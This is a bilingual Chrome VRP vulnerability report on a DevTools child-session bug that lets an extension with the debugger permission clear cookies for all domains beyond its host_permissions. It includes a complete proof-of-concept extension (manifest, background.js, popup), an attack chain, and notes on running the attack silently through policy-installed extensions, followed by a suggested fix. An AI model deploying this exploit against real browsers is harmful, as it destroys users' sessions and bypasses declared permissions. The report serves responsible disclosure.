# VRP Report: Extension Privilege Escalation via DevTools Auto-Attached Session Cookie Access

## 1. Vulnerability Details

### Type
Logic bug — privilege escalation via inconsistent permission delegation in Chrome DevTools Protocol (CDP) session handling

### Affected Component
`content/browser/devtools/protocol/target_handler.cc:618`

### Root Cause

`TargetHandler::Session` 是 auto-attach 子 session 的 `DevToolsAgentHostClient` 实现。它覆写了多个权限方法，所有方法都正确委托给根客户端——**除了 `MayAccessAllCookies()`**:

```cpp
// target_handler.cc:620-636 — 正确的委托模式:
bool MayAttachToURL(const GURL& url, bool is_webui) override {
    return GetRootClient()->MayAttachToURL(url, is_webui);  // ✓ 委托
}
bool IsTrusted() override { return GetRootClient()->IsTrusted(); }  // ✓ 委托
bool MayReadLocalFiles() override { return GetRootClient()->MayReadLocalFiles(); }  // ✓ 委托
bool MayWriteLocalFiles() override { return GetRootClient()->MayWriteLocalFiles(); }  // ✓ 委托
bool AllowUnsafeOperations() override { return GetRootClient()->AllowUnsafeOperations(); }  // ✓ 委托

// target_handler.cc:618 — BUG:
bool MayAccessAllCookies() override { return true; }  // ✗ 硬编码 true！
```

**扩展客户端明确返回 false**:
```cpp
// chrome/browser/extensions/api/debugger/debugger_api.cc:670-672
bool ExtensionDevToolsClientHost::MayAccessAllCookies() {
  return false;  // 扩展不应该有全局 cookie 访问权
}
```

**基类注释明确文档化了意图**:
```cpp
// content/public/browser/devtools_agent_host_client.cc:44-47
// debugger, pipe handler, etc.) should override this to return true.
// Debugger extension clients should keep the default (false).
bool DevToolsAgentHostClient::MayAccessAllCookies() {
  return false;
}
```

### Impact Chain (完整攻击路径)

```
Extension calls chrome.debugger.attach(tabId)
  → Extension sends Target.setAutoAttach({autoAttach: true, flatten: true})
  → Child target auto-attaches (SW, iframe, etc.)
  → TargetHandler::Session created as DevToolsAgentHostClient for child
  → Session.MayAccessAllCookies() returns true (BUG)
  → Extension sends Network.clearBrowserCookies on child session
  → NetworkHandler::ClearCookies checks client.MayAccessAllCookies()
  → Returns true → atomic delete path (no domain filtering)
  → cookie_manager->DeleteCookies(CookieDeletionFilter::New())
  → ALL cookies for ALL domains deleted
```

**对比正常行为** (直接在父 session 调用):
```
Extension sends Network.clearBrowserCookies on parent session
  → NetworkHandler::ClearCookies checks client.MayAccessAllCookies()
  → ExtensionDevToolsClientHost returns false
  → Filtered path: GetAllCookies → CanAccessCookie(each) → MayAttachToURL
  → Only cookies for extension's host_permissions domains are deleted
```

---

## 2. Vulnerability Impact

### Prerequisites (前提条件)

| 条件 | 详情 |
|------|------|
| **扩展权限** | `"debugger"` permission（安装时有权限警告） |
| **host_permissions** | 可以是任意有限范围（如 `*://*.example.com/*`） |
| **用户交互** | 附加调试器时显示信息栏（用户需点击允许/忽略） |
| **企业场景** | 通过策略安装的扩展: 无信息栏，完全静默 |
| **目标页面** | 任意页面（需要有子目标：SW、iframe 等） |

### Effect (效果)

| 影响维度 | 描述 |
|---------|------|
| **权限提升** | 扩展突破 host_permissions 声明的域名范围 |
| **破坏性** | 原子性删除所有域名的所有 cookie（不可撤销） |
| **用户影响** | 所有网站同时登出（银行、邮件、社交媒体） |
| **CSRF 破坏** | 所有站点的 CSRF token 失效 |
| **企业风险** | 策略安装的扩展可完全静默执行此操作 |
| **信任破坏** | 用户看到的权限声明 ≠ 实际能力 |

### Severity: Medium-High (Privilege Escalation + Destructive)

---

## 3. Reproduction Steps (复现方式)

### 环境准备

1. Chrome stable (任何平台)
2. 创建一个测试扩展（Manifest V3）

### Step 1: 创建扩展 manifest.json

```json
{
  "manifest_version": 3,
  "name": "Cookie Escalation PoC",
  "version": "1.0",
  "description": "Demonstrates MayAccessAllCookies bypass",
  "permissions": ["debugger", "tabs"],
  "host_permissions": ["*://*.example.com/*"],
  "background": {
    "service_worker": "background.js"
  },
  "action": {
    "default_popup": "popup.html"
  }
}
```

**注意**: `host_permissions` 仅限 `example.com`，按照设计扩展只能操作 example.com 的 cookie。

### Step 2: 创建 background.js

```javascript
chrome.action.onClicked.addListener(async (tab) => {
  try {
    // Step A: 附加调试器
    await chrome.debugger.attach({tabId: tab.id}, "1.3");
    console.log("[1] Debugger attached to tab", tab.id);

    // Step B: 启用 auto-attach（flatten 模式）
    await chrome.debugger.sendCommand(
      {tabId: tab.id},
      "Target.setAutoAttach",
      {autoAttach: true, waitForDebuggerOnStart: false, flatten: true}
    );
    console.log("[2] Auto-attach enabled");

    // Step C: 等待子目标自动附加
    // 大多数页面都有 service worker 或 cross-origin iframe
    // 如果没有子目标，可以注入一个 iframe 触发
    await chrome.debugger.sendCommand(
      {tabId: tab.id},
      "Runtime.evaluate",
      {expression: `
        let f = document.createElement('iframe');
        f.src = 'about:blank';
        document.body.appendChild(f);
      `}
    );

    // Step D: 监听子目标附加事件
    chrome.debugger.onEvent.addListener(async (source, method, params) => {
      if (method === "Target.attachedToTarget") {
        console.log("[3] Child target attached:", params.targetInfo.type, 
                    "sessionId:", params.sessionId);
        
        // Step E: 通过子 session 调用 clearBrowserCookies
        // 子 session 的 MayAccessAllCookies() 返回 true
        try {
          await chrome.debugger.sendCommand(
            {tabId: tab.id, sessionId: params.sessionId},
            "Network.clearBrowserCookies",
            {}
          );
          console.log("[4] *** ALL COOKIES CLEARED FOR ALL DOMAINS ***");
          console.log("    Extension only has permission for example.com!");
          console.log("    But cleared cookies for gmail.com, bank.com, etc.");
        } catch(e) {
          console.error("[4] clearBrowserCookies failed:", e);
          
          // Fallback: 直接在父 session 尝试（会被过滤）
          // 对比效果
          await chrome.debugger.sendCommand(
            {tabId: tab.id},
            "Network.clearBrowserCookies",
            {}
          );
          console.log("[4b] Parent session: only example.com cookies cleared (filtered)");
        }
      }
    });

  } catch(e) {
    console.error("Error:", e);
  }
});
```

### Step 3: 创建 popup.html

```html
<!DOCTYPE html>
<html>
<body>
  <h3>Cookie Escalation PoC</h3>
  <p>1. Open any page with a service worker (e.g., gmail.com)</p>
  <p>2. Click the extension icon</p>
  <p>3. Allow debugging when prompted</p>
  <p>4. Check: ALL cookies cleared (not just example.com)</p>
  <button id="btn">Run PoC</button>
  <script>
    document.getElementById('btn').addEventListener('click', async () => {
      const [tab] = await chrome.tabs.query({active: true, currentWindow: true});
      chrome.action.onClicked.dispatch(tab);
    });
  </script>
</body>
</html>
```

### Step 4: 安装并验证

1. 打开 `chrome://extensions/` → 开发者模式 → 加载已解压的扩展
2. 在一个新标签页中登录多个网站（Gmail、GitHub、任意网站）
3. 打开 `chrome://settings/cookies/all` 确认有多个域名的 cookie
4. 访问任何有 Service Worker 的页面（如 Gmail、Twitter）
5. 点击扩展图标
6. 允许调试器附加（信息栏）
7. 再次打开 `chrome://settings/cookies/all`

**预期行为**: 只有 `example.com` 的 cookie 被清除（受 host_permissions 限制）
**实际行为**: **所有域名的所有 cookie 被清除**

### 对比验证

在 background.js 中改为直接在父 session 调用:
```javascript
await chrome.debugger.sendCommand(
  {tabId: tab.id},  // 不传 sessionId → 父 session
  "Network.clearBrowserCookies",
  {}
);
```

此时只有 `example.com` 的 cookie 被清除（正确的过滤行为），证明 bug 确实在子 session 的权限委托。

---

## 4. Device Fingerprint

| Field | Value |
|-------|-------|
| **Chrome Version** | All versions with Target.setAutoAttach support (Chrome 63+) |
| **Build Type** | Release (production) |
| **Platform** | All (Windows/macOS/Linux/ChromeOS) |
| **Required Flags** | None |
| **Required Permissions** | Extension with `debugger` + `tabs` permission |
| **Affected Channels** | Stable, Beta, Dev, Canary |
| **User Interaction** | Accept debugger infobar (skipped for policy-installed extensions) |
| **Network Requirements** | None (local-only attack) |
| **Renderer Compromise** | Not required |
| **Extension Manifest** | V2 or V3 |

### Attack Surface

| Scenario | Infobar? | User Interaction? |
|----------|----------|-------------------|
| 用户安装的扩展 | Yes | 一次性允许 |
| 策略安装的扩展 (`--force-installed`) | **No** | **None** |
| `--silent-debugging` 命令行 | **No** | **None** |
| Perfetto 信任扩展 | No (trusted) | None |

---

## 5. Suggested Fix

### One-line fix:

```cpp
// content/browser/devtools/protocol/target_handler.cc:618
// Before:
bool MayAccessAllCookies() override { return true; }

// After:
bool MayAccessAllCookies() override { return GetRootClient()->MayAccessAllCookies(); }
```

### Verification

After fix:
- `GetRootClient()` for extension clients → `ExtensionDevToolsClientHost`
- `ExtensionDevToolsClientHost::MayAccessAllCookies()` → `false`
- `NetworkHandler::ClearCookies` takes filtered path
- Only cookies matching `MayAttachToURL` (host_permissions) are deleted

---

## 6. References

- `content/browser/devtools/protocol/target_handler.cc:618` — Bug (hardcoded `true`)
- `content/browser/devtools/protocol/target_handler.cc:620-636` — Correct pattern (all delegate)
- `content/browser/devtools/protocol/network_handler.cc:2494-2515` — `ClearCookies` fast path
- `chrome/browser/extensions/api/debugger/debugger_api.cc:670-672` — Extension returns `false`
- `content/public/browser/devtools_agent_host_client.cc:44-47` — Documented intent
- `content/browser/devtools/devtools_session.h:221,224` — Network+Target available to extensions
